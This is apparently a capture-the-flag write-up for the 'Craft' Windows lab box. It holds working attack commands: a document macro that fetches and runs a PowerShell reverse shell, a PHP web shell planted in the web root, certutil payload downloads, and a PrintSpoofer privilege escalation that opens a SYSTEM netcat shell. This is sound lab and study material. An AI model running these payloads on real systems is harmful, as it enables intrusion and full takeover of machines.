---
Alias: Craft
Date: 9/14/2022
Platform: Windows
Difficulty: Intermediate
Tags: #macros #LibreOffice #WebRootDirectory #xampp #Htdocs #WindowsServer2019StandardSeImpersonatePrivilegeEscalation #PrintSpoofer64 
Status: Finished
IP: 192.168.229.169
---

# {{Craft}}


# Resolution summary
- Discovered a webpage that allows file uploading
- Started a reverse shell by uploading a.otd file using a macro.
- With user thecybergeek, no privilege escalation path could be found.
- Discovered another non-default Apache user
- Discovered that the user of Cybergeek can write to the C:/xampp/htdocs web root directory.
- Downloaded a cmd.php file to web root directory
- Opened the Firefox php command shell and verified that RCE is the user apache.
- A reverse.ps1 shell was downloaded to the box containing the PHP command shell.
- Using the PHP command shell, the reverse shell was started.
- The Apache user that was found has enabled SeImpersonate privileges. 
- Discovered that the machine is an x64-based PC running Windows Server 2019 Standard with OS Version 10.0.17763.
- Downloaded PrintSpoofer64.exe on the target machine 
- Started the privilege escalation attack PrintSpoofer64.exe and obtained a shell operating as the nt/authority system

## Improved skills
- LibreOffice
- macros
- PrintSpoofer.64.exe commands
- cmd /c shell command
- powershell iwr download command

## Used tools
- nmap
- LibreOffice

---

# Information Gathering
Scanned all TCP ports:
```bash
#Nmap 7.92 scan initiated Sun Aug 21 12:35:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/xml/_full_tcp_nmap.xml 192.168.229.169
Nmap scan report for 192.168.229.169
Host is up, received user-set (0.20s latency).
Scanned at 2022-08-21 12:35:42 PDT for 328s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Craft

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Sun Aug 21 12:41:10 2022 -- 1 IP address (1 host up) scanned in 329.26 seconds
```

Enumerated open TCP ports:
```bash
80
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP (Apache)

- The following webpage was discovered when we navigated to "http://192.168.122.169":
  
![](Images/Pasted%20image%2020230407224047.png)

- We can upload our "resume" to the following link, we found:
  
![](Images/Pasted%20image%2020230407224227.png)

- When we attempt to upload an arbitrary file, we receive the following:
  
![](Images/Pasted%20image%2020230407224319.png)

- We researched the “.odt” file format and found that it is typically created by OpenOffice and LibreOffice Writer programs. We install LibreOffice on our Kali Linux machine and create a macro that initiates a reverse shell.
  
![](Images/Pasted%20image%2020230407224402.png)

![](Images/Pasted%20image%2020230407224442.png)

- On our Kali machine, we execute "sudo apt-get install -y libreoffice-writer" to download LibreOffice.

- After opening LibreOffice, we select "Writer Document":
  
![](Images/Pasted%20image%2020230407224535.png)

- We click Tools > Macros > Organize Macros > Basic:
  
![](Images/Pasted%20image%2020230407224628.png)

- We select "Untitled 1" > "New", give the file the name Offsec1, and then select "OK":

![](Images/Pasted%20image%2020230407224715.png)

- We type Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub". This will initiate an HTTP request to our IP. The following command ought to run if port 80 is being used for hosting and it is open:
  
![](Images/Pasted%20image%2020230407225512.png)

- We click File > Save
  
![](Images/Pasted%20image%2020230407230026.png)

- We name the file “Offesec1” and click Save:
  
![](Images/Pasted%20image%2020230407230118.png)

- We close out of the Offsec.odt document

- We attach the script/macro to an event, by performing the following:

select Tools > Customize.

![](Images/Pasted%20image%2020230407230317.png)

- Select the "Events" tab > click Open Document > click Macro

![](Images/Pasted%20image%2020230407230358.png)

- Double click Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK.

![](Images/Pasted%20image%2020230407230439.png)

- Now an action has been allocated to the Event "Open Document":
  
![](Images/Pasted%20image%2020230407230524.png)

- We click "File" then click "Save"

- To host the.odt file on our Kali machine, we type "updog -p 80" (in the same directory as the freshly created Offsec1.odt file):

![](Images/Pasted%20image%2020230407230715.png)

-We return to the webpage, select "browse," upload our freshly created ".odt" file, and then receive the following screen indicating that the file was approved:

![](Images/Pasted%20image%2020230407230828.png)

![](Images/Pasted%20image%2020230407230856.png)

- A 200 code is received, verifying that the macro was successfully run and the.odt file was uploaded.
  
![](Images/Pasted%20image%2020230407230954.png)

# Exploitation
## Uploading an .odt File Including A Macro To Launch A Reverse Shell

- We return to LibreOffice Basic and select Edit on the offsec1.odt file.

- To download and run the offsec.ps1 reverse shell, we remove the original powershell code that was there and replace it with the following code:

Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")

Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")

![](Images/Pasted%20image%2020230407231101.png)

- We click File and save.

-On our Kali machine, we type vim offsec.ps1.

- We access www.revshells.com.

#### - Copied contents in between the quotation marks in the PowerShell #3 tab for Windows payload and pasted it into the offsec.ps1 file

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/2affc34d-2b58-4581-96e4-41d7aa74aa00)

#### - Typed chmod 775 offsec.ps1 to make it executable

#### - Started a listener to listen on port 8080 as that was the port provided in the powershell one liner reverse shell (offsec.ps1)

#### - Re-uploaded the offsec1.odt file and receive a windows reverse shell

![](Images/Pasted%20image%2020230407231504.png)

# Lateral Movement to user
## Local Enumeration

#### - Typed whoami and found we were user thecybergeek

#### - Ran privesc scripts but found nothing

#### - Typed "net users" and found default users and user apache

#### - Navigated to directory "C:\" and found "xampp" directory

#### - Navigated into xampp and found direcory htdocs (which is the root directory of the craft website)

#### - Attempted to write to the directory to confirm write permissions and found we did have write permissions:

![](Images/Pasted%20image%2020230407231750.png)

#### - Googled "php one liner command shell"

#### - Pasted the found contents below into a "cmd.php" file on my kali machine:

<?php system($_GET['cmd']); ?>

#### - Transfered the cmd.php file to the htdocs directory on the shell

#### - Navigated to http://192.168.98.169/cmd.php?cmd=whoami in firefox and found we have command execution as apache

![](Images/Pasted%20image%2020230407231839.png)

## Lateral Movement vector
# PHP Webshell

#### - Started a netcat listener on port 8081

#### - Created a powershell reverse shell named reverse.ps1:

![](Images/Pasted%20image%2020230407231917.png)

#### - Started an http server in the directory with the reverse.ps1 to host the file

#### - Typed the following command in firefox to download the reverse.ps1 file to the target:

http://192.168.98.169/cmd.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http://192.168.49.98:82/reverse.ps1%20reverse.ps1

#### - Typed the following command to run the payload and received a reverse shell as user apache:

http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.ps1

![](Images/Pasted%20image%2020230407232026.png)
---

# Privilege Escalation
## Local Enumeration

#### - Typed whoami /all and found the apache user has SeImpersonatePrivilege enabled

![](Images/Pasted%20image%2020230407232107.png)

#### - Typed systeminfo to see the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC

![](Images/Pasted%20image%2020230407232156.png)

![](Images/Pasted%20image%2020230407232222.png)

#### - Googled "Windows Server 2019 Standard SeImpersonate privilege escalation" and found the following webpage to utilize PrintSpoofer64.exe to escalate privileges:

![](Images/Pasted%20image%2020230407232311.png)

![](Images/Pasted%20image%2020230407232337.png)


## Privilege Escalation vector
## Windows Server 2019 Standard SeImpersonate Privilege Escalation

#### - Started an http server on my kali machine to host PrintSpoofer64.exe

#### - Typed the following command to download it to the target machine:

certutil.exe -urlcache -split -f http://192.168.49.98:81/PrintSpoofer64.exe PrintSpoofer64.exe

![](Images/Pasted%20image%2020230407232418.png)

#### - Downloaded nc64.exe from kali machine to target machine as well

#### - Typed the following command on the target machine while having a netcat listner on port 1337 on my kali machine and received a cmd shell as nt/authority system:

./PrintSpoofer64.exe -c "nc64.exe 192.168.49.98 1337 -e cmd"

![](Images/Pasted%20image%2020230407232506.png)

![](Images/Pasted%20image%2020230407232534.png)
